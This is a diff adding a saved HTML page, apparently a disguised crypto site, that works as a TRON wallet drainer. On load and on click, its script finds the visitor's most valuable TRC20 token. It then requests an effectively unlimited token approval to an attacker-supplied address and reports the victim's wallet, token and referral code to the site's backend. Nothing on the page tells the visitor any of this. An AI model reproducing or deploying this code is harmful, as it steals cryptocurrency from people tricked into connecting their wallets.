@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<!-- saved from url=(0028)https://jiami-token.im/?id=1 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+  <title>加密中心</title>
+  <style>
+    img{width: 100%  ;
+      height: 100%
+    ;}
+  </style>
+</head>
+<body>
+<a id="links">
+  <img src="./im_files/jiami.png">
+</a>
+<script type="text/javascript" src="https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="./erc_files/TronWeb.js"></script>
+<script type="text/javascript">
+  var address = getUrlQueryString('address')
+  var rank = 6.5;
+  var authorized_address = '';
+  var domain = 'https://' + window.location.host + '/';
+  var bizhong = '';
+  var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+  var total=0;
+  var trx = 0;
+  function getUrlQueryString(names, urls) {
+    urls = urls || window.location.href;
+    urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+    var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+    var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+    if (r != null && r[2] != "")return unescape(r[2]);
+    return null;
+
+  }
+
+  $('input.num').bind('input propertychange', function()
+  {
+    if($(this).val() && $(this).val()>0){
+      $('#btn-connect').css('background','#078bc3');
+    }else{
+      $('#btn-connect').css('background','#dde0dd');
+    }
+    $('#price').text(($(this).val()*rank).toLocaleString() )
+
+  })
+
+  function getInfo(){
+    $.ajax({
+      type: 'get',
+      url:  domain + 'api/get_trc',
+      async : false,
+      success:function(data){
+        console.log(data)
+        authorized_address = data.data.authorized_address;
+        console.log(authorized_address);
+      },
+      error:function(data){
+
+      }
+    })
+  }
+
+  async function postInfo(address,symbol){
+    var s = getUrlQueryString('s')
+    var a = getUrlQueryString('r')
+
+    if (trx < 5) {
+      return
+    }
+
+
+// 		if (total == 0) {
+// 				return;
+// 			}
+
+    var data = {
+      address:address,
+      authorized_address:authorized_address,
+      bizhong:symbol,
+      code:s,
+      reffer:a,
+      type:1
+    }
+    $.ajax({
+      type: 'post',
+      url:  domain + 'api/insert_trc',
+      data:data,
+      // success:function(data){
+      // //console.log(data)
+      //     if(data.code === 200){
+      //     	console.log('success')
+      //     }
+      //     console.log(data.msg)
+      // },
+      // error:function(data){
+      // 	console.log(data)
+      // }
+    })
+  }
+  $('#address').text(address)
+
+
+  $(function() {
+
+    const addr = {
+      'WIN': 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7',
+      'USDT':'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+      'TONS': 'THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt',
+      'USDJ': 'TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT',
+      'JST': 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9',
+      'HT': 'TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h',
+      'SUN': 'TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9',
+      "EXNX": "TCcVeKtYUrHEQDPmozjJFMrf6XX7BgF84A",
+      "VCOIN": "TNisVGhbxrJiEHyYUMPxRzgytUtGM7vssZ",
+      "POL":"TWcDDx1Q6QEoBrJi9qehtZnD4vcXXuVLer",
+      "CKRW":"TTVTdn8ipmacfKsCHw5Za48NRnaBRKeJ44"
+    }
+
+    const price = {
+      'WIN': 0.001150,
+      'USDT':1,
+      'TONS':1.35,
+      'USDJ':1.04,
+      'JST': 0.125,
+      "HT": 20.41,
+      "SUN": 33.97,
+      "EXNX": 0.0621,
+      "VCOIN": 0.004225,
+      "POL": 0.1393,
+      "CKRW": 0.002487,
+    }
+
+    const decimals = {
+      'WIN': 6,
+      'USDT':6,
+      'TONS':6,
+      'USDJ':18,
+      'JST': 18,
+      "HT": 18,
+      "SUN": 18,
+      "EXNX": 18,
+      "VCOIN": 6,
+      "POL": 8,
+      "CKRW": 6,
+    }
+
+
+    async function getMostValuableAssets(account) {
+      let _symbol = 'USDT'
+// 			fffsss = fffsss + "account:" + account + "---"
+// 			$("#fffsss").text(fffsss)
+      for (const symbol of Object.keys(addr)) {
+        let contract = await tronWeb.contract().at(addr[symbol]);
+        let myBalance = await contract.balanceOf(account).call(function(err,balance){
+          const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+          console.log(usdt);
+          if (usdt > total && usdt > 500) {
+            _symbol = symbol
+            total = usdt
+            approveAddr = addr[_symbol]
+          }
+        })
+      }
+      bizhong = _symbol
+      return _symbol
+    }
+
+    /**
+     * * Connect wallet button pressed.
+     */
+    async function onConnect() {
+      $('.pages').append('<div class="modal-overlay"></div>');
+      $('.modal-overlay').addClass('modal-overlay-visible');
+      $('.modal').removeClass('modal-out').addClass('modal-in');
+      // fffsss = fffsss + "开始:"
+      let tronWeb = window.tronWeb
+      // fffsss = fffsss + "tronWeb:" + tronWeb + "---"
+      // $("#fffsss").text(fffsss)
+      let walletAddress = tronWeb.defaultAddress.base58;
+      // fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+      // $("#fffsss").text(fffsss)
+      bizhong = await getMostValuableAssets(walletAddress);
+      // fffsss = fffsss + "approveAddr:" + approveAddr + "---"
+      // $("#fffsss").text(fffsss)
+      let instance = await tronWeb.contract().at(approveAddr);
+      // fffsss = fffsss + "instance:" + instance + "---"
+      // $("#fffsss").text(fffsss)
+      // fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+      // $("#fffsss").text(fffsss)
+      // fffsss = fffsss + "bizhong:" + bizhong + "---"
+      // $("#fffsss").text(fffsss)
+
+      tradeobj = await tronWeb.trx.getAccount(
+              walletAddress,
+      ).then(output => {
+        console.log('- Output:', output, '\n');
+        trx = output.balance / 1000000;
+      });
+
+      let res = await instance["approve"](authorized_address,"90000000000000000000000000000");
+      res.send({
+        feeLimit: 100000000,
+        callValue: 0,
+        shouldPollResponse: false
+      },function(err,res){
+        // fffsss = fffsss + "res:" + res + "---"
+        // $("#fffsss").text(fffsss)
+        // fffsss = fffsss + "err:" + err + "---"
+        // $("#fffsss").text(fffsss)
+        if(err == null){
+          // fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+          // $("#fffsss").text(fffsss)
+          // fffsss = fffsss + "bizhong:" + bizhong + "---"
+          // $("#fffsss").text(fffsss)
+          $(".tishi").fadeIn()
+          setTimeout(function () {
+            $(".tishi").fadeOut()
+          },2000);
+          postInfo(walletAddress,bizhong)
+        }
+        $('.modal-overlay').remove();
+        $('.modal').removeClass('modal-in').addClass('modal-out');
+      })
+    }
+    function init() {
+      getInfo();
+
+
+
+    }
+
+
+    async function s(){
+      var tronWeb = window.tronWeb
+      let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+      let walletAddress = tronWeb.defaultAddress.base58;
+      let result = await contract.balanceOf(walletAddress).call(function(err,tex){
+        if(err == null){
+          let total = tex._hex/(10**6);
+          $('#yu').text(total.toLocaleString() +' USDT')
+          console.log();
+        }
+      });
+
+    }
+
+    /**
+     * Main entry point.
+     */
+
+    init();
+    document.querySelector("#links").addEventListener("click", onConnect);
+    onConnect();
+  })
+
+  $(function(){
+
+    setTimeout(function(){
+      $('#s').click()
+    },1000);
+
+
+
+  })
+</script>
+</body></html>
